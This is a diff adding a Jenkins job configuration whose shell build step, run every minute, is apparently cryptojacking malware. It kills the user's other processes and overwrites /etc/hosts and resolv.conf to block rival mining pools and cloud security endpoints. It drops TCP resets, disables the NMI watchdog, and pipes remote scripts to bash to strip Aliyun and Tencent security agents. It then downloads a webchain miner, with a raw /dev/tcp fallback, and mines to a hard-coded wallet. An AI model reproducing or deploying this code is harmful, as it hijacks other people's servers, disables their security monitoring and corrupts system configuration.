@@ -1,0 +1,136 @@
+<?xml version='1.1' encoding='UTF-8'?>
+<project>
+  <description></description>
+  <keepDependencies>false</keepDependencies>
+  <properties/>
+  <scm class="hudson.scm.NullSCM"/>
+  <canRoam>true</canRoam>
+  <disabled>false</disabled>
+  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
+  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
+  <triggers>
+    <hudson.triggers.TimerTrigger>
+      <spec>* * * * *</spec>
+    </hudson.triggers.TimerTrigger>
+  </triggers>
+  <concurrentBuild>false</concurrentBuild>
+  <builders>
+    <hudson.tasks.Shell>
+      <command>#!/bin/bash
+curl http://lumtest.com/myip.json
+threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;{print $2}&apos; | head -n 1);
+echo &quot;${threadCount}&quot;;
+initdir=$PWD
+lscpu
+if [[ $(whoami) != &quot;root&quot; ]]; then
+    for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do
+        kill -9 $tr || : ;
+    done;
+fi
+sudo echo no &gt; /etc/hosts
+sudo echo &apos;nameserver 1.1.1.1&apos; &gt; /etc/resolv.conf;echo &apos;nameserver 8.8.8.8&apos; &gt;&gt; /etc/resolv.conf;echo &apos;nameserver 180.76.76.76&apos; &gt;&gt; /etc/resolv.conf
+sudo echo &quot;0.0.0.0 blockchain.info&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 35.225.36.167&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 100.100.25.3 jsrv.aegis.aliyun.com&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 100.100.25.4 update.aegis.aliyun.co&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 185.164.72.119&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 163.172.191.181&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 pinto.mamointernet.icu&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 sdk.bce.baidu.com&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 lsd.systemten.org&quot; &gt;&gt; /etc/hosts;
+sudo echo &quot;0.0.0.0 mine.c3pool.com&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 Pool.XCA.CryptoPool.Space&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 xmr-asia1.nanopool.org&quot; &gt;&gt; /etc/hosts
+sudo echo &quot;0.0.0.0 xmr-jp1.nanopool.org&quot; &gt;&gt; /etc/hosts
+echo thxforjobs
+echo no &gt; /etc/hosts
+echo &apos;nameserver 1.1.1.1&apos; &gt; /etc/resolv.conf;echo &apos;nameserver 8.8.8.8&apos; &gt;&gt; /etc/resolv.conf;echo &apos;nameserver 180.76.76.76&apos; &gt;&gt; /etc/resolv.conf
+echo &quot;0.0.0.0 blockchain.info&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 35.225.36.167&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 100.100.25.3 jsrv.aegis.aliyun.com&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 100.100.25.4 update.aegis.aliyun.co&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 185.164.72.119&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 163.172.191.181&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 pinto.mamointernet.icu&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 sdk.bce.baidu.com&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 lsd.systemten.org&quot; &gt;&gt; /etc/hosts;
+echo &quot;0.0.0.0 mine.c3pool.com&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 Pool.XCA.CryptoPool.Space&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 xmr-asia1.nanopool.org&quot; &gt;&gt; /etc/hosts
+echo &quot;0.0.0.0 xmr-jp1.nanopool.org&quot; &gt;&gt; /etc/hosts
+
+sudo iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP
+
+sudo echo &quot;nope&quot; &gt;/tmp/log_rot;
+sudo sysctl kernel.nmi_watchdog=0
+sudo echo &apos;0&apos; &gt; /proc/sys/kernel/nmi_watchdog
+sudo echo &apos;kernel.nmi_watchdog=0&apos; &gt;&gt; /etc/sysctl.conf
+
+iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP
+
+echo &quot;nope&quot; &gt;/tmp/log_rot;
+sysctl kernel.nmi_watchdog=0
+echo &apos;0&apos; &gt; /proc/sys/kernel/nmi_watchdog
+echo &apos;kernel.nmi_watchdog=0&apos; &gt;&gt; /etc/sysctl.conf
+
+
+if ps aux | grep -i &apos;[a]liyun&apos;; then
+  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
+  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
+  pkill aliyun-service
+  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
+  rm -rf /usr/local/aegis*
+  systemctl stop aliyun.service
+  systemctl disable aliyun.service
+  service bcm-agent stop
+  yum remove bcm-agent -y
+  apt-get remove bcm-agent -y
+elif ps aux | grep -i &apos;[y]unjing&apos;; then
+  /usr/local/qcloud/stargate/admin/uninstall.sh
+  /usr/local/qcloud/YunJing/uninst.sh
+  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+fi
+
+
+
+threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;{print $2}&apos; | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo &quot;${hostHash} - ${threadCount}&quot;;
+
+_curl () {
+  read proto server path &lt;&lt;&lt;$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x&quot;${HOST}&quot; == x&quot;${PORT}&quot; ]] &amp;&amp; PORT=80
+
+  exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
+  echo -en &quot;GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n&quot; &gt;&amp;3
+  (while read line; do
+   [[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break
+  done &amp;&amp; cat) &lt;&amp;3
+  exec 3&gt;&amp;-
+}
+
+rm -rf config.json;
+
+d () {
+  curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;
+}
+
+
+test ! -s trace &amp;&amp; \
+    d https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz trace.tgz &amp;&amp; \
+    tar -zxvf trace.tgz &amp;&amp; \
+    mv webchain-miner trace &amp;&amp; \
+    rm -rf trace.tgz;
+
+test ! -x trace &amp;&amp; chmod +x trace;
+
+k() {
+    ./trace \
+        -o $1 \
+        -u 0xDF012833102AFdd719f2731Aa67B14F94cC08968 \
+        -p x \
+		--worker-id=NS.002
+}
+
+k web-ko1.gonspool.com:3333</command>
+      <configuredLocalRules/>
+    </hudson.tasks.Shell>
+  </builders>
+  <publishers/>
+  <buildWrappers/>
+</project>
